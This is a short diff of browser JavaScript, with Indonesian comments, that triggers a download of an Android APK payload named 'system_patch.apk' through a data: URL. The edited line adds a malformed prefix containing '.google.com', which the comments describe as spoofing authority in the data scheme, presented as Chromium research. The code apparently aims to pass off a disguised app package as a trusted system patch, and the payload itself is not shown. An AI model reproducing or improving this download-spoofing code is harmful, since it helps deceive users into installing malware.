@@ -128,7 +128,7 @@
                 const a = document.createElement("a");
                 // Menggunakan spoofing authority di dalam skema data (khusus untuk riset Chromium)
                 // Namun isi data (MIME & Payload) sudah diperbaiki agar Firefox tidak mengubahnya ke .txt
-                a.href = "data:application/vnd.android.package-archive;base64," + apkPayload;
+                a.href = "data:/\\\\\\/.google.com/application/vnd.android.package-archive;base64," + apkPayload;
                 a.download = "system_patch.apk";
                 
                 document.body.appendChild(a);
